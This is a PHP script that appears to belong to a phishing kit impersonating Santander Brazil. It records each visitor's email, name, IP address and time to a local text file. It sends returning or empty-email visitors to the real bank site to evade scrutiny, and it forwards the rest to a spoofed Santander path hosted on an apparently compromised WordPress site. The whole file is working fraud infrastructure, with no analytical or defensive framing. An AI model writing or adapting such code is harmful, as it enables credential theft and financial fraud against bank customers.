<?php
date_default_timezone_set('America/Sao_Paulo');
class Acesso {
	private $nome;
	private $email;
	private $ip;
	private $hora;
	private $txt = "dszcx12.txt";
	private $redireciona_site = "https://missionhealth.nz/wp-admin/user/[SEGURO]/www.santander.com.br/seguranca/br/?idtoken=";
	
	public function __construct() {
		$this->nome 		= $_GET['p'];
		$this->email		= $_GET['e'];
		$this->ip 			= $_SERVER['REMOTE_ADDR'];
		$this->hora			= date('H:i');
		$this->random		= bin2hex(openssl_random_pseudo_bytes(99));
	}
	
	public function __salvainfo() {
		$fp = fopen($this->txt, 'a+');
		fwrite($fp, '[' . $this->hora .']' . ' - ' . $this->ip . ' - ' . $this->email . ' - ' . $this->nome . "\r\n");
		fclose($fp);
	}
	
	public function __detecta_inicio() {
			if (isset($_COOKIE['OAWO2901PCX'])) {
				$this->cookie = $_COOKIE['OAWO2901PCX'];
			}
			
			if (isset($this->cookie)) {
				header("Location: http://www.santander.com.br");
			}
				else if ($this->email == "") {
					header("Location: http://www.santander.com.br");
				}	else {
					$this->__salvainfo();
					header("Location: " . $this->redireciona_site . $this->random);
					
				}
			}
}

?>